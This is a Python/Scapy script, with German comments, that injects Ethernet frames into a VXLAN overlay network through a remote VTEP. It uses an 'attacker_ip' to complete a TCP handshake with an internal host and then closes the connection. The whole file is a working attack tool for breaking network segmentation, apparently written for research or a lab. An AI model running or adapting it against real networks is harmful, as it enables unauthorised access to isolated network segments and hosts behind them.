#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Usage:
./tcp_connect.py IP Port

./tcp_connect.py 10.0.0.10 80

 """
from scapy.all import *
from scapy.layers.http import *
from scapy.layers import http
import random
import sys
import threading
from threading import Thread
import time
import webbrowser
import os


### Variabeln definieren
vtep_dst = "192.168.10.149"
vtep_src = "172.20.10.254" #Hier muss eine IP aus meinem Subnetz stehen, sonst verwirft der erste Hop das Paket!
vxlanport = 4789
vx_vnid = 1
mac_src = "be:fb:ef:be:fb:ef"
mac_dst = "ea:e4:59:b5:42:03" #"ff:ff:ff:ff:ff:ff"
attacker_ip = "172.20.10.10"
http_port = int(sys.argv[2])
destination_ip = sys.argv[1]
s_port = random.randint(20000,65500)



### Variablen einfuehren
CONNECTION = {"connected": False}
CONNECTION_FINISHED = False
threads = []

### TCP-Flags definieren
Flags = {"FIN": 0x01,"SYN": 0x02,"RST": 0x04,"PSH": 0x08,"ACK": 0x10,"URG": 0x20,"ECE": 0x40,"CWR": 0x80}

debug = 1

### VXLAN Paket: Hierueber werden Ethernet Frames ins LAN eingefuert
VXLAN = IP(src=vtep_src,dst=vtep_dst)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vx_vnid,flags="Instance")/Ether(dst=mac_dst,src=mac_src)
### getStr ist der String im HTTP Request




def sniff_all_packets():
    sniff(session=TCPSession, filter = "tcp src port " + str(http_port), prn=packet_received, store=False, count= 2)
    return

def packet_received(packet):
    payload_length = len(packet[TCP].payload)
    flags = packet.getlayer(TCP).flags
    in_seq = packet[TCP].seq
    in_ack = packet[TCP].ack
    dst_port = packet.getlayer(TCP).dport
    ack_nr = in_seq + payload_length + 1
    seq_nr = in_ack

    ### starte den connection manager Thread
    global threads
    connection_management = threading.Thread(target=TCP_connection_manager, args=(packet, payload_length, flags, in_seq, in_ack, dst_port))
    threads.append(connection_management)
    connection_management.start()
    


def TCP_connection_manager(packet, payload_length, flags, in_seq, in_ack, dst_port):
    if debug:
        indent = "\t"
        if len(str(packet.getlayer(IP).src)) < 10 :
            indent = "\t\t"  
        print("### <-- " + str(flags) + "\treceived from\t" + str(packet.getlayer(IP).src) + ":" + str(packet.getlayer(TCP).sport) + indent + "< ACK#: " + str(in_ack) + " | SEQ#: " + str(in_seq) + " >")
    
    global CONNECTION
    global CONNECTION_FINISHED
    #### ACK# = SEQ# + Payload Laenge + 1
    #### SEQ# = ACK#
    ack_nr = in_seq + payload_length# + 1
    seq_nr = in_ack

    ### SYN/ACK oder Payload_Length > 0 received
    if payload_length > 0 or (flags & (Flags["SYN"] ^ Flags["ACK"])) == 18:
        send_flags = 'A'
        if debug:
            ### --> A	sent to		VX: 192.168.10.149 VNID: 1 // 10.0.0.10:80   < ACK#: 3233855856 | SEQ#: 1 >
            print("### --> A\tsent to\t\t" + destination_ip + ":" + str(http_port) + "\t\t< ACK#: " + str(ack_nr) + " | SEQ#: " + str(seq_nr) + " >")
        send_tcp(dst_port, seq_nr, ack_nr, send_flags)

        ### SYN/ACK received --> Connection = True
        if (flags & (Flags["SYN"] ^ Flags["ACK"])) == 18:
           CONNECTION = { "connected": True , "dst_port": dst_port, "seq_nr": seq_nr, "ack_nr": ack_nr}

    ### FIN received --> Connection Finish is acknoledged. acknoledge too
    if flags & Flags["FIN"]:
        send_flags = 'A'
        if debug:
            print("### --> A\tsent to\t\t" + destination_ip + ":" + str(http_port) + "\t\t< ACK#: " + str(ack_nr) + " | SEQ#: " + str(seq_nr) + " >")
        send_tcp(dst_port, seq_nr, ack_nr, send_flags)
        CONNECTION_FINISHED = True
    return

def send_tcp(src_port, seqnr, acknr, tcp_flags):
    ack = VXLAN / IP(src=attacker_ip,dst=destination_ip) / TCP(dport=http_port, sport=src_port,seq=seqnr, ack=acknr, flags=tcp_flags)
    out_ack = send(ack, verbose=0)
    return


def fin_function():
    ### Wait until FIN packet is received
    while CONNECTION_FINISHED is not True:
        time.sleep(0.2)
    ### Connection is Finished --> FIN Packet Received
    print ("\r\n\r\n")
    print("Connection finished")


def send_request():
    while CONNECTION["connected"] is not True:
        time.sleep(0.01)
    if debug:
        print("### --> FA\tsent to\t\t" + destination_ip + ":" + str(http_port) + "\t\t< ACK#: " + str(CONNECTION["ack_nr"]) + " | SEQ#: " + str(CONNECTION["seq_nr"]) + " >")
    send_tcp(CONNECTION["dst_port"], CONNECTION["seq_nr"], CONNECTION["ack_nr"], 'F''A')




########################
### Erstelle die Threads
SNIFFER = threading.Thread(target=sniff_all_packets)
Fin_Thread = threading.Thread(target=fin_function)
send_request_thread = threading.Thread(target=send_request)
### starte die Threads
send_request_thread.start()
Fin_Thread.start()
SNIFFER.start()
### warte bis threads laufen
time.sleep(1)
#######################




#### SEND SYN
syn = VXLAN / IP(src=attacker_ip,dst=destination_ip) / TCP(sport=s_port, dport=http_port, flags='S')
send(syn, verbose=0)
if debug:
       print("### --> S\tsent to\t\t" + destination_ip + ":" + str(http_port) + "\t\t< SEQ#: 0 >")

